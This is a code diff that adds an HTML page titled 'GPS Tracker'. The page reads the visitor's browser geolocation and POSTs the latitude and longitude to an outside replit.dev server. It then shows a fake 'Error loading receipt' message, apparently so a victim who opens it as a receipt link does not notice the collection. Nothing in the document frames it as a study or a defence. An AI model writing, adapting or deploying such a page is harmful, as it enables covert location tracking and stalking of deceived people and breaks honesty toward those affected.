@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>GPS Tracker</title>
+</head>
+<body>
+  <h2>Loading... please wait</h2>
+  <script>
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        fetch("https://90dcf3a8-5962-436e-b023-c534307f80c6-00-2oy1xavsaekkh.sisko.replit.dev/location", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            latitude: position.coords.latitude,
+            longitude: position.coords.longitude
+          })
+        }).then(() => {
+          document.body.innerHTML = "<h2>Error loading receipt. Please try again later.</h2>";
+        });
+      });
+    } else {
+      document.body.innerHTML = "<h2>Location access not supported</h2>";
+    }
+  </script>
+</body>
+</html>
